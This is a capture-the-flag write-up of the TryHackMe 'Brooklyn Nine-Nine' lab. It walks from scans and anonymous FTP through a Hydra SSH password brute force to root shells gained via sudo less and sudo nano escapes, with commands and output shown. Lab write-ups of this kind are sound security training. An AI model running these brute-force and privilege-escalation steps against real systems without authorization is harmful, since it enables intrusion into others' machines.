# [Brooklyn Nine-Nine THM Room](https://tryhackme.com/room/brooklynninenine)
## Scanning
### Nmap
```bash
nmap -sC -sV -oN nmapIntial target-ip
```

```python
# Nmap 7.60 scan initiated Tue Sep 12 20:37:44 2023 as: nmap -sC -sV -oN nmapInitial target-ip
Nmap scan report for ip-10-10-104-245.eu-west-1.compute.internal (target-ip)
Host is up (0.016s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.131.93
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:0E:D2:20:DB:4F (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 12 20:37:55 2023 -- 1 IP address (1 host up) scanned in 10.53 seconds
```

- Anonymous FTP login allowed.
- There is a file on the server titled `note_to_jake`
- Port 80 is open
- SSH is open, and that will likely be how we gain access to the machine. 

### Gobuster
```bash
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/12 20:41:19 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2023/09/12 20:41:44 Finished
===============================================================
```

- The `/server-status` directory returns a 403: Forbidden status code. 
- Not much else worthy of note here.

---
## Enumeration
### FTP Enumeration
- To take advantage of the Anonymous FTP authentication, use the following syntax:
```
ftp target-ip

Connected to target-ip
220 (vsFTPd 3.0.3)
Name (target-ip:root): Anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>
```

- Pull down the `note_to_jake.txt` file with the following syntax:
```
ftp> get note_to_jake.txt
```

- Exit FTP server and use `cat note_to_jake.txt` to display the following contents:
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

- This note asserts that there is a Jake user and the password for that user is weak. This could lead to a brute force attempt at SSH authentication using something like Hydra. See ***System Hacking*** below. 
The FTP Enumeration note may provide more guidance. 

### HTTP Enumeration
#### Site source code:
```
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```

- Steganography is referenced, likely referring to something being hidden in the landing page of the website. It looks like this:

![Brooklyn Nine-Nine Landing Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/0e1b7053-156b-4d8e-801c-ad10f78993eb)

***Note: This is a screenshot and not the actual image from the challenge.***

---
## System Hacking
### Gaining System Access
With the note provided by the FTP server, we have concluded that there is a Jake user with a weak password. At this point, we can employ [[Hydra]] to brute force that password by trying to authenticate via SSH. The syntax is as follows:
```
hydra -l jake -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -t 6 ssh://target-ip
```

For context:
- `-l` - specifies the known username
- `-P` - specifies a wordlist to pull passwords from and attempt to authenticate with.
- `-t` - specifies number of threads
- `ssh://target-ip` - names the IP address and protocol we are attempting to authenticate to with the provided credentials

The output from the above is:
```
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-09-12 21:07:15
[DATA] max 6 tasks per 1 server, overall 6 tasks, 10000 login tries (l:1/p:10000), ~1667 tries per task
[DATA] attacking ssh://target-ip:22/
[STATUS] 186.00 tries/min, 186 tries in 00:01h, 9814 to do in 00:53h, 6 active
[STATUS] 182.00 tries/min, 546 tries in 00:03h, 9454 to do in 00:52h, 6 active
[STATUS] 180.86 tries/min, 1266 tries in 00:07h, 8734 to do in 00:49h, 6 active
[22][ssh] host: target-ip   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-09-12 21:15:54
```

- We can see that Hydra successfully found the Jake user password to be set as: 987654321
- We can use this to authenticate to the machine via SSH and grab the user flag with the following syntax:
```bash
ssh jake@target-ip

The authenticity of host 'target-ip (target-ip)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'target-ip' (ECDSA) to the list of known hosts.
jake@target-ip's password: 987654321
Last login: Tue May 26 08:56:58 2020

jake@brookly_nine_nine:~$ 
```

We can further enumerate this machine by searching through directories. It is worth noting that there are 2 other user directories in the `/home` directory, belonging to `/amy` and `/holt`. The `user.txt` file can be found in the `/holt` directory. 

---
## Privilege Escalation
Typical Privilege Escalation begins with moving over enumeration scripts like LinPEASS and LinEnum for automation. While those run, it is a good idea to check `sudo` privileges with `sudo -l`. If some are found, checking them on GTFOBins is worthwhile.

- To start, I ran `sudo -l` to check privileges for the jake user. This was the output:
```
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

- GTFOBins gives us a way to spawn a root shell with the following sytnax:
```
sudo less /etc/profile
!/bin/sh
```

- Navigate to the `/root` directory and `cat root.txt`
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: {flag}
Enjoy!!
```

---
## Rabbit Holes
### Searching for Steganography
- I navigated to the /brooklyn99.jpg directory seen in the page source code. I downloaded it since there was reference to steganography in the comments.
- I used Exiftool, CyberChef, and Binwalk to pull metadata from it, but to no avail. 

### Holt User
- After obtaining root permissions, you can switch to the Holt user. Using `sudo -l` will show the following:
```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

- I just checked this before grabbing the root flag just to see if Holt had root privileges, since he is the chief of police in the show.
- However, `/bin/nano` can also be given to GTFOBins to spawn a root shell using the following syntax:
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
